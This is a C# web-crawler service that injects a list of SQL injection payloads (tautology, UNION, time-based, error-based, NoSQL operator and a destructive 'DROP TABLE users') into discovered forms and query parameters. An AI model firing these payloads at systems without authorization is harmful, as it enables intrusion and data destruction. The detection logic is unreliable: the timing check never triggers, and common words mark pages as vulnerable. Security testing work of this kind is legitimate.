using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using Api.Models.DTOs;
using Microsoft.Extensions.Logging;

namespace Api.Services
{
    public class SqlInjectionScanner
    {
        private readonly ILogger<SqlInjectionScanner> _logger;
        private readonly HttpClient _httpClient;
        private readonly CookieContainer _cookies;
        private readonly int _maxCrawlDepth = 3;
        private readonly int _maxConcurrentRequests = 10;
        private readonly int _timeBasedThresholdMs = 3000;

        private readonly string[] _sqlPayloads = new[]
        {
            // Classic payloads
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' OR 'x'='x",
            "1' OR '1'='1' --",
            "' UNION SELECT NULL --",
            // Blind SQLi payloads
            "' OR 1=1; WAITFOR DELAY '0:0:3'--",
            "1' AND SLEEP(3)--",
            "1' SELECT pg_sleep(3)--",
            // Error-based payloads
            "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT (ELT(1=1,1)))",
            "1' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT version()))--",
            // JSON injection
            "\" OR 1=1--",
            "{\"$gt\": \"\"}"
        };

        public SqlInjectionScanner(ILogger<SqlInjectionScanner> logger, HttpClient httpClient)
        {
            _logger = logger ?? throw new ArgumentNullException(nameof(logger));
            _httpClient = httpClient ?? throw new ArgumentNullException(nameof(httpClient));
            _cookies = new CookieContainer();

            _httpClient.DefaultRequestHeaders.Add("User-Agent", "SQLiScanner/1.0");
            _httpClient.Timeout = TimeSpan.FromSeconds(20);
        }

        public async Task<List<InputPoint>> CrawlWebsite(string baseUrl, bool deepScan, CancellationToken cancellationToken)
        {
            var inputPoints = new ConcurrentBag<InputPoint>();
            var visitedUrls = new ConcurrentDictionary<string, bool>();
            var urlsToVisit = new ConcurrentQueue<(string Url, int Depth)>();
            urlsToVisit.Enqueue((baseUrl, 0));

            var commonParams = new[] { "query", "search", "q", "input", "text", "comment", "message", "id", "user", "username", "email", "password" };
            var semaphore = new SemaphoreSlim(_maxConcurrentRequests);

            while (urlsToVisit.TryDequeue(out var urlInfo) && !cancellationToken.IsCancellationRequested)
            {
                var (currentUrl, depth) = urlInfo;
                if (visitedUrls.TryAdd(currentUrl, true))
                {
                    await semaphore.WaitAsync(cancellationToken);
                    try
                    {
                        var response = await _httpClient.GetAsync(currentUrl, cancellationToken);
                        if (response.IsSuccessStatusCode)
                        {
                            var content = await response.Content.ReadAsStringAsync(cancellationToken);

                            // Extract URL parameters
                            var parameters = ExtractQueryParameters(currentUrl);
                            if (parameters.Any())
                            {
                                inputPoints.Add(new InputPoint
                                {
                                    Url = currentUrl,
                                    Type = "GET",
                                    Parameters = parameters
                                });
                            }
                            else if (deepScan)
                            {
                                inputPoints.Add(new InputPoint
                                {
                                    Url = currentUrl,
                                    Type = "GET",
                                    Parameters = commonParams.ToDictionary(p => p, p => "")
                                });
                            }

                            // Extract forms with additional context
                            var forms = ExtractForms(content, currentUrl);
                            foreach (var form in forms)
                            {
                                inputPoints.Add(form);
                            }

                            // Extract links for deep scanning
                            if (deepScan && depth < _maxCrawlDepth)
                            {
                                var links = ExtractLinks(content);
                                var tasks = links.Select(async link =>
                                {
                                    var absoluteUrl = MakeAbsoluteUrl(currentUrl, link);
                                    if (absoluteUrl != null && absoluteUrl.StartsWith(baseUrl) && !visitedUrls.ContainsKey(absoluteUrl))
                                    {
                                        urlsToVisit.Enqueue((absoluteUrl, depth + 1));
                                    }
                                });
                                await Task.WhenAll(tasks);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        _logger.LogError(ex, $"Error crawling {currentUrl}");
                    }
                    finally
                    {
                        semaphore.Release();
                    }
                }
            }

            return inputPoints.DistinctBy(ip => ip.Url + ip.Type).ToList();
        }



        public async Task<List<SResult>> TestSqlInjection(string baseUrl, bool deepScan, CancellationToken cancellationToken)
        {
            if (string.IsNullOrEmpty(baseUrl))
                throw new ArgumentException("Base URL cannot be null or empty.", nameof(baseUrl));

            var results = new ConcurrentBag<SResult>();
            var resultSet = new ConcurrentDictionary<string, SResult>();
            var inputPoints = await CrawlWebsite(baseUrl, deepScan, cancellationToken);
            var semaphore = new SemaphoreSlim(_maxConcurrentRequests);

            var tasks = inputPoints.Select(async inputPoint =>
            {
                var vulnerablePayloads = new List<string>();
                var vulnerableParams = new List<string>();
                var context = "";
                var endpoint = IdentifyEndpoint(inputPoint.Url);

                foreach (var payload in _sqlPayloads)
                {
                    await semaphore.WaitAsync(cancellationToken);
                    try
                    {
                        var (isVulnerable, testedParams, ctx) = await TestInputPoint(inputPoint, payload, cancellationToken);
                        if (isVulnerable)
                        {
                            vulnerablePayloads.Add(payload);
                            vulnerableParams.AddRange(testedParams.Except(vulnerableParams));
                            context = ctx;
                        }
                    }
                    catch (Exception ex)
                    {
                        _logger.LogError(ex, $"Error testing {inputPoint.Url} with payload {payload}");
                    }
                    finally
                    {
                        semaphore.Release();
                    }
                }

                if (vulnerableParams.Any())
                {
                    var resultDetails = inputPoint.Type == "GET"
                        ? $"Vulnerable query parameters on {endpoint} endpoint: {string.Join(", ", vulnerableParams)}. Page: {inputPoint.Url}"
                        : $"Vulnerable form submission on {endpoint} endpoint: {context}. Page: {inputPoint.Url}";

                    var result = new SResult
                    {
                        Url = inputPoint.Url,
                        IsVulnerable = true,
                        //Details = $"SQL injection vulnerability found with payloads: {string.Join(", ", vulnerablePayloads.Select(HttpUtility.UrlEncode))}. {resultDetails}",
                        Details = $"SQL injection vulnerability found ",
                        PayloadUsed = vulnerablePayloads.First(),
                        InputPointType = inputPoint.Type,
                        VulnerableParameters = vulnerableParams.Distinct().ToList()
                    };

                    // Only add form info if this was a form submission
                    if (inputPoint.Type != "GET")
                    {
                        result.FormName = inputPoint.FormName;
                        result.FormId = inputPoint.FormId;
                        result.FormAction = inputPoint.FormAction;

                        // Enhance details with form info if available
                        if (!string.IsNullOrEmpty(inputPoint.FormName) || !string.IsNullOrEmpty(inputPoint.FormId))
                        {
                            result.Details += $" Form: {(!string.IsNullOrEmpty(inputPoint.FormName) ? $"Name='{inputPoint.FormName}' " : "")}" +
                                            $"{(!string.IsNullOrEmpty(inputPoint.FormId) ? $"ID='{inputPoint.FormId}'" : "")}";
                        }
                    }

                    var resultKey = $"{inputPoint.Url}|{string.Join(",", vulnerableParams.OrderBy(p => p))}|{inputPoint.FormName}|{inputPoint.FormId}";
                    resultSet.TryAdd(resultKey, result);
                }
            });

            await Task.WhenAll(tasks);

            foreach (var result in resultSet.Values)
            {
                results.Add(result);
            }

            if (!results.Any())
            {
                results.Add(new SResult
                {
                    Url = baseUrl,
                    IsVulnerable = false,
                    Details = "No SQL injection vulnerabilities found",
                    VulnerableParameters = new List<string>()
                });
            }

            return results.OrderBy(r => r.Url).ToList();
        }








        private async Task<(bool IsVulnerable, List<string> VulnerableParameters, string Context)> TestInputPoint(InputPoint inputPoint, string payload, CancellationToken cancellationToken)
        {
            var vulnerableParams = new List<string>();
            var context = "";
            try
            {
                HttpResponseMessage response;
                var stopwatch = System.Diagnostics.Stopwatch.StartNew();

                if (inputPoint.Type == "GET")
                {
                    var uriBuilder = new UriBuilder(inputPoint.Url);
                    var query = HttpUtility.ParseQueryString(uriBuilder.Query);

                    foreach (var param in inputPoint.Parameters.Keys)
                    {
                        var originalQuery = HttpUtility.ParseQueryString(uriBuilder.Query);
                        originalQuery[param] = payload;
                        uriBuilder.Query = originalQuery.ToString();

                        response = await _httpClient.GetAsync(uriBuilder.Uri, cancellationToken);
                        stopwatch.Restart();

                        if (stopwatch.ElapsedMilliseconds > _timeBasedThresholdMs)
                        {
                            vulnerableParams.Add(param);
                            context = $"GET parameter: {param}";
                            return (true, vulnerableParams, context);
                        }

                        if (response.IsSuccessStatusCode)
                        {
                            var content = await response.Content.ReadAsStringAsync(cancellationToken);
                            if (IsSqlErrorPresent(content) || IsGenericVulnerabilityIndicator(content))
                            {
                                vulnerableParams.Add(param);
                                context = $"GET parameter: {param}";
                                return (true, vulnerableParams, context);
                            }
                        }
                    }
                }
                else
                {
                    var formFields = string.Join(", ", inputPoint.Parameters.Keys);
                    context = $"Form fields: {formFields}";

                    foreach (var param in inputPoint.Parameters.Keys)
                    {
                        var formData = inputPoint.Parameters.ToDictionary(
                            p => p.Key,
                            p => p.Key == param ? payload : (p.Key.Contains("json") ? "{}" : "")
                        );

                        var content = new FormUrlEncodedContent(formData);
                        response = await _httpClient.PostAsync(inputPoint.Url, content, cancellationToken);
                        stopwatch.Restart();

                        if (stopwatch.ElapsedMilliseconds > _timeBasedThresholdMs)
                        {
                            vulnerableParams.Add(param);
                            context = $"Form field: {param} in form with fields: {formFields}";
                            return (true, vulnerableParams, context);
                        }

                        if (response.IsSuccessStatusCode)
                        {
                            if (IsSqlErrorPresent(await response.Content.ReadAsStringAsync(cancellationToken)) || IsGenericVulnerabilityIndicator(await response.Content.ReadAsStringAsync(cancellationToken)))
                            {
                                vulnerableParams.Add(param);
                                context = $"Form field: {param} in form with fields: {formFields}";
                                return (true, vulnerableParams, context);
                            }
                        }
                    }
                }

                stopwatch.Stop();
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, $"Error testing input point {inputPoint.Url} with payload {payload}");
            }
            return (false, vulnerableParams, context);
        }

        private string IdentifyEndpoint(string url)
        {
            try
            {
                var uri = new Uri(url);
                var path = uri.AbsolutePath.ToLower();
                
                // Common endpoint patterns
                var endpointPatterns = new Dictionary<string, string>
                {
                    { "/login", "Login" },
                    { "/signin", "Login" },
                    { "/signup", "Registration" },
                    { "/register", "Registration" },
                    { "/search", "Search" },
                    { "/profile", "User Profile" },
                    { "/account", "User Account" },
                    { "/api/", "API" },
                    { "/admin", "Admin" },
                    { "/dashboard", "Dashboard" },
                    { "/comments", "Comments" },
                    { "/post", "Post" },
                    { "/query", "Search Query" },
                    { "/", "Home" } // Added for root URLs
                };

                foreach (var pattern in endpointPatterns)
                {
                    if (path == pattern.Key || path.StartsWith(pattern.Key + "/") || path.Contains(pattern.Key))
                    {
                        return pattern.Value;
                    }
                }

                // Fallback to last path segment
                var segments = path.Trim('/').Split('/');
                return segments.LastOrDefault() ?? "Home";
            }
            catch
            {
                return "Home";
            }
        }

        private bool IsSqlErrorPresent(string content)
        {
            var sqlErrorPatterns = new[]
            {
                "SQL syntax.*MySQL",
                "Warning.*mysql_",
                "valid MySQL result",
                "PostgreSQL.*ERROR",
                "Microsoft SQL Server.*Error",
                "ODBC SQL Server Driver",
                "sqlite3.OperationalError",
                "SQLiteException",
                "Syntax error",
                "unexpected end of SQL command",
                "JDBCException",
                "SQLSTATE",
                "PDOException",
                "SQL error",
                "database error"
            };

            return sqlErrorPatterns.Any(pattern =>
                Regex.IsMatch(content, pattern, RegexOptions.IgnoreCase));
        }

        private bool IsGenericVulnerabilityIndicator(string content)
        {
            return content.Contains("admin") ||
                   content.Contains("root") ||
                   content.Contains("password") ||
                   content.Contains("You have an error in your SQL syntax");
        }

        private Dictionary<string, string> ExtractQueryParameters(string url)
        {
            try
            {
                var uri = new Uri(url);
                var query = HttpUtility.ParseQueryString(uri.Query);
                return query.AllKeys.Where(k => k != null)
                    .ToDictionary(k => k, k => query[k] ?? "");
            }
            catch
            {
                return new Dictionary<string, string>();
            }
        }

        // private List<InputPoint> ExtractForms(string content, string baseUrl)
        // {
        //     var forms = new List<InputPoint>();
        //     var formRegex = new Regex(@"<form\s*.*?>.*?</form>", RegexOptions.Singleline | RegexOptions.IgnoreCase);
        //     var inputRegex = new Regex(@"<(input|textarea|select)\s*.*?name\s*=\s*[""'](.*?)[""'].*?>", RegexOptions.IgnoreCase);
        //     var matches = formRegex.Matches(content);

        //     foreach (Match match in matches)
        //     {
        //         var formContent = match.Value;
        //         var actionMatch = Regex.Match(formContent, @"action\s*=\s*[""'](.*?)[""']", RegexOptions.IgnoreCase);
        //         var methodMatch = Regex.Match(formContent, @"method\s*=\s*[""'](.*?)[""']", RegexOptions.IgnoreCase);

        //         var action = actionMatch.Success ? actionMatch.Groups[1].Value : baseUrl;
        //         var method = methodMatch.Success ? methodMatch.Groups[1].Value.ToUpper() : "POST";

        //         var absoluteUrl = MakeAbsoluteUrl(baseUrl, action) ?? baseUrl;
        //         var parameters = new Dictionary<string, string>();

        //         var inputMatches = inputRegex.Matches(formContent);
        //         foreach (Match input in inputMatches)
        //         {
        //             var name = input.Groups[2].Value;
        //             if (!string.IsNullOrEmpty(name))
        //             {
        //                 parameters[name] = "";
        //             }
        //         }

        //         if (parameters.Any())
        //         {
        //             forms.Add(new InputPoint
        //             {
        //                 Url = absoluteUrl,
        //                 Type = method,
        //                 Parameters = parameters
        //             });
        //         }
        //     }

        //     return forms;
        // }


        private List<InputPoint> ExtractForms(string content, string baseUrl)
{
    var forms = new List<InputPoint>();
    var formRegex = new Regex(@"<form\s*.*?>.*?</form>", RegexOptions.Singleline | RegexOptions.IgnoreCase);
    var inputRegex = new Regex(@"<(input|textarea|select)\s*.*?name\s*=\s*[""'](.*?)[""'].*?>", RegexOptions.IgnoreCase);
    var formNameRegex = new Regex(@"name\s*=\s*[""'](.*?)[""']", RegexOptions.IgnoreCase);
    var formIdRegex = new Regex(@"id\s*=\s*[""'](.*?)[""']", RegexOptions.IgnoreCase);
    var matches = formRegex.Matches(content);

    foreach (Match match in matches)
    {
        var formContent = match.Value;
        var actionMatch = Regex.Match(formContent, @"action\s*=\s*[""'](.*?)[""']", RegexOptions.IgnoreCase);
        var methodMatch = Regex.Match(formContent, @"method\s*=\s*[""'](.*?)[""']", RegexOptions.IgnoreCase);
        var nameMatch = formNameRegex.Match(formContent);
        var idMatch = formIdRegex.Match(formContent);

        var action = actionMatch.Success ? actionMatch.Groups[1].Value : baseUrl;
        var method = methodMatch.Success ? methodMatch.Groups[1].Value.ToUpper() : "POST";
        var formName = nameMatch.Success ? nameMatch.Groups[1].Value : string.Empty;
        var formId = idMatch.Success ? idMatch.Groups[1].Value : string.Empty;

        var absoluteUrl = MakeAbsoluteUrl(baseUrl, action) ?? baseUrl;
        var parameters = new Dictionary<string, string>();

        var inputMatches = inputRegex.Matches(formContent);
        foreach (Match input in inputMatches)
        {
            var name = input.Groups[2].Value;
            if (!string.IsNullOrEmpty(name))
            {
                parameters[name] = "";
            }
        }

        if (parameters.Any())
        {
            forms.Add(new InputPoint
            {
                Url = absoluteUrl,
                Type = method,
                Parameters = parameters,
                FormName = formName,
                FormId = formId,
                FormAction = action
            });
        }
    }

    return forms;
}



        private List<string> ExtractLinks(string content)
        {
            var links = new List<string>();
            var linkRegex = new Regex(@"href\s*=\s*[""'](.*?)[""']", RegexOptions.IgnoreCase);
            var matches = linkRegex.Matches(content);

            foreach (Match match in matches)
            {
                var link = match.Groups[1].Value;
                if (!string.IsNullOrEmpty(link) &&
                    !link.StartsWith("#") &&
                    !link.StartsWith("javascript:"))
                {
                    links.Add(link);
                }
            }

            return links;
        }

        private string? MakeAbsoluteUrl(string baseUrl, string relativeUrl)
        {
            try
            {
                var baseUri = new Uri(baseUrl);
                var absoluteUri = new Uri(baseUri, relativeUrl);
                return absoluteUri.ToString();
            }
            catch
            {
                return null;
            }
        }
    }
}